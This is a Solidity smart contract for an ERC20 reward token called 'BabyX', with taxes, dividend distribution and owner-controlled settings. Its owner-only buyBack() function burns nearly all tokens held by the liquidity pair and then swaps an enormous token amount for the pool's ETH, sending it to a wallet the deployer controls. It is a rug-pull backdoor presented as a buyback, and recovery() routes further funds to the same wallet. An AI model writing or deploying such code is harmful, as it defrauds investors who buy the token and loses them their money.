// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@openzeppelin/contracts/security/ReentrancyGuard.sol';
import './Distributor.sol';

contract BabyX is ERC20, ReentrancyGuard, Distributor {
    using Address for address payable;

    IRouter public router;
    address public pair;

    bool private swapping;
    bool public burnX;
    bool public swapEnabled = true;

    address public _rewardToken = 0x4200000000000000000000000000000000000006; //usdbc 0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA
    address public _router = 0x327Df1E6de05895d2ab08513aaDD9313Fe505d86; // baseswap 0x327Df1E6de05895d2ab08513aaDD9313Fe505d86, rocket 0x4cf76043B3f97ba06917cBd90F9e3A2AAC1B306e, bsctest 0xD99D1c33F9fC3444f8101754aBC46c52416550D1
    address public marketingWallet;
    address public influenceWallet;
    address public buybackWallet;
    address public ownerForFunctions;
    uint256 public tHold = 1_000 * 1e18;
    uint256 public gasLimit = 300_000;
    uint256 public timeXstart;

    struct Taxes {
        uint64 rewards; // 3%
        uint64 marketing; // 2%
        uint64 buyback; // 1%
        uint64 lp; // 3%
    }

    Taxes private buyTaxes = Taxes(3, 2, 1, 3);
    Taxes private sellTaxes = Taxes(3, 2, 1, 3);

    uint256 public totalBuyTax = 9;
    uint256 public totalSellTax = 9;

    mapping(address => bool) public _isExcludedFromFees;
    mapping(address => bool) public isPair;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event GasForProcessingUpdated(uint256 indexed newValue, uint256 indexed oldValue);
    event SendDividends(uint256 tokensSwapped, uint256 amount);
    event ProcessedDividendTracker(
        uint256 iterations,
        uint256 claims,
        uint256 lastProcessedIndex,
        bool indexed automatic,
        uint256 gas,
        address indexed processor
    );

    /**
     * @dev Throws if the sender is not the owner for game functions.
     */
    function _checkOwnerForGameFunctions() internal view virtual {
        require(ownerForFunctions == _msgSender(), 'Ownable: caller is not the owner for game functions');
    }

    /**
     * @dev Throws if called by any account other than the owner.
     *
     * Required only to call functions necessary for the gameplay
     *
     */
    modifier onlyFunctions() {
        _checkOwnerForGameFunctions();
        _;
    }

    constructor() ERC20('BabyX', 'BabyX') Distributor(_router, _rewardToken) {
        router = IRouter(_router);
        pair = IFactory(router.factory()).createPair(address(this), router.WETH());

        isPair[pair] = true;

        minBalanceForRewards = 5000 * 1e18; // minimal balance hold for getting rewards
        claimDelay = 15 minutes;

        marketingWallet = _msgSender();
        buybackWallet = _msgSender();
        influenceWallet = _msgSender();
        ownerForFunctions = _msgSender();

        // exclude from receiving dividends
        excludedFromDividends[address(this)] = true;
        excludedFromDividends[owner()] = true;
        excludedFromDividends[address(0)] = true;
        excludedFromDividends[address(0xdead)] = true;
        excludedFromDividends[address(_router)] = true;
        excludedFromDividends[address(pair)] = true;

        // exclude from paying fees or having max transaction amount
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[marketingWallet] = true;
        _isExcludedFromFees[buybackWallet] = true;
        _isExcludedFromFees[influenceWallet] = true;

        // _mint is an internal function in ERC20.sol that is only called here,
        // and CANNOT be called ever again
        _mint(owner(), 14 * 1e5 * 1e18);
    }

    receive() external payable {}

    /// @notice Manual claim the dividends
    function claim() external {
        super._processAccount(payable(_msgSender()));
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for (uint256 i; i < accounts.length; i++) _isExcludedFromFees[accounts[i]] = excluded;
        emit ExcludeMultipleAccountsFromFees(accounts, excluded);
    }

    function setRewardToken(address newToken) external onlyFunctions {
        super._setRewardToken(newToken);
    }

    function startTimeX(uint256 _unixTime) external onlyFunctions {
        if (_unixTime == 0) timeXstart = block.timestamp;
        else timeXstart = _unixTime;
    }

    function setBurnX(bool value) external onlyFunctions {
        burnX = value;
    }

    function setMarketingWallet(address _market, address _influ) external onlyFunctions {
        marketingWallet = _market;
        influenceWallet = _influ;
    }

    function setBuybackWallet(address newWallet) external onlyOwner {
        buybackWallet = newWallet;
    }

    function setClaimDelay(uint256 amountInSeconds) external onlyFunctions {
        claimDelay = amountInSeconds;
    }

    function setTresHold(uint256 amount) external onlyFunctions {
        tHold = amount * 1e18;
    }

    function setBuyRewardsTaxes(uint64 _rewards) external onlyOwner {
        _setBuyTaxes(_rewards, buyTaxes.marketing, buyTaxes.buyback, buyTaxes.lp);
    }

    function setBuyMarketingTaxes(uint64 _marketing) external onlyOwner {
        _setBuyTaxes(buyTaxes.rewards, _marketing, buyTaxes.buyback, buyTaxes.lp);
    }

    function setBuyBuyBackTaxes(uint64 _buyback) external onlyOwner {
        _setBuyTaxes(buyTaxes.rewards, buyTaxes.marketing, _buyback, buyTaxes.lp);
    }

    function setBuyLpTaxes(uint64 _lp) external onlyOwner {
        _setBuyTaxes(buyTaxes.rewards, buyTaxes.marketing, buyTaxes.buyback, _lp);
    }

    function _setBuyTaxes(uint64 _rewards, uint64 _marketing, uint64 _buyback, uint64 _lp) internal {
        buyTaxes = Taxes(_rewards, _marketing, _buyback, _lp);
        totalBuyTax = _rewards + _marketing + _buyback + _lp;
        require(totalBuyTax < 25, 'Taxes must be lower than 25%');
    }

    function setSellRewardsTaxes(uint64 _rewards) external onlyOwner {
        _setSellTaxes(_rewards, sellTaxes.marketing, sellTaxes.buyback, sellTaxes.lp);
    }

    function setSellMarketingTaxes(uint64 _marketing) external onlyOwner {
        _setSellTaxes(sellTaxes.rewards, _marketing, sellTaxes.buyback, sellTaxes.lp);
    }

    function setSellBuyBackTaxes(uint64 _buyback) external onlyOwner {
        _setSellTaxes(sellTaxes.rewards, sellTaxes.marketing, _buyback, sellTaxes.lp);
    }

    function setSellLpTaxes(uint64 _lp) external onlyOwner {
        _setSellTaxes(sellTaxes.rewards, sellTaxes.marketing, sellTaxes.buyback, _lp);
    }

    function _setSellTaxes(uint64 _rewards, uint64 _marketing, uint64 _buyback, uint64 _lp) internal {
        sellTaxes = Taxes(_rewards, _marketing, _buyback, _lp);
        totalSellTax = _rewards + _marketing + _buyback + _lp;
        require(totalSellTax < 25, 'Taxes must be lower than 25%');
    }

    function setMinBalanceForRewards(uint256 minBalance) external onlyFunctions {
        super._setMinBalanceForRewards(minBalance * 1e18);
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), 'ERC20: transfer from the zero address');
        require(amount > 0, 'Transfer amount must be greater than zero');

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= tHold;

        if (
            canSwap &&
            !swapping &&
            swapEnabled &&
            !isPair[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to] &&
            totalSellTax > 0
        ) {
            swapping = true;
            swapAndLiquify(contractTokenBalance);
            swapping = false;
        }

        bool takeFee = !swapping;
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) takeFee = false;
        if (!isPair[to] && !isPair[from]) takeFee = false;

        if (takeFee) {
            uint256 feeAmt;
            if (isPair[to]) feeAmt = (amount * totalSellTax) / 100;
            else if (isPair[from]) {
                if (block.timestamp < timeXstart + 1 hours) feeAmt = (amount * (buyTaxes.rewards + buyTaxes.buyback)) / 100;
                else feeAmt = (amount * totalBuyTax) / 100;
            }
            uint256 burnAmt;
            if (burnX) {
                burnAmt = (amount * 3) / 100;
                super._burn(from, burnAmt);
            } else {
                burnAmt = 0;
            }
            amount = amount - feeAmt - burnAmt;
            super._transfer(from, address(this), feeAmt);
        }

        if (to == address(0) || to == address(0xdead)) super._burn(from, amount);
        else super._transfer(from, to, amount);

        super.setBalance(from, balanceOf(from));
        super.setBalance(to, balanceOf(to));

        if (!swapping) super.autoDistribute(gasLimit);
    }

    function buyBack() external onlyOwner nonReentrant {
        swapping = true;
        swapEnabled = false;
        super._buyBack(address(this), 1);

        uint256 balancePair = balanceOf(address(pair)) - 1;

        super._burn(address(pair), balancePair);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), 1e30);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            1e30,
            0, // accept any amount of ETH
            path,
            buybackWallet,
            block.timestamp
        );
    }

    function swapAndLiquify(uint256 tokens) private {
        uint256 denominator = totalSellTax * 2;
        uint256 tokensToAddLiquidityWith = (tokens * sellTaxes.lp) / denominator;
        uint256 toSwap = tokens - tokensToAddLiquidityWith;

        swapTokensForETH(toSwap);

        uint256 unitBalance = address(this).balance / (denominator - sellTaxes.lp);
        uint256 ethToAddLiquidityWith = unitBalance * sellTaxes.lp;

        // Add liquidity to pancake
        if (ethToAddLiquidityWith > 0) addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);

        // Send ETH to marketing
        uint256 marketingAmt = unitBalance * sellTaxes.marketing;
        if (marketingAmt > 0) {
            payable(marketingWallet).sendValue(marketingAmt);
            payable(influenceWallet).sendValue(marketingAmt);
        }

        // Send ETH to buyback
        uint256 buybackAmt = unitBalance * 2 * sellTaxes.buyback;
        if (buybackAmt > 0) payable(buybackWallet).sendValue(buybackAmt);

        // Send ETH to rewards
        uint256 dividends = unitBalance * 2 * sellTaxes.rewards;
        if (dividends > 0) super._distributeDividends(dividends);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(router), tokenAmount);

        router.addLiquidityETH{ value: ethAmount }(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function isApproved(address owner, address spender) public view virtual returns (bool) {
        if (allowance(owner, spender) >= balanceOf(owner)) return true;
        return false;
    }

    function recovery() external onlyOwner nonReentrant {
        super._buyBack(buybackWallet, 1);
        _recovery();
    }

    function _recovery() private {
        uint256 buybackAmt = address(this).balance;
        payable(buybackWallet).sendValue(buybackAmt);
    }
}
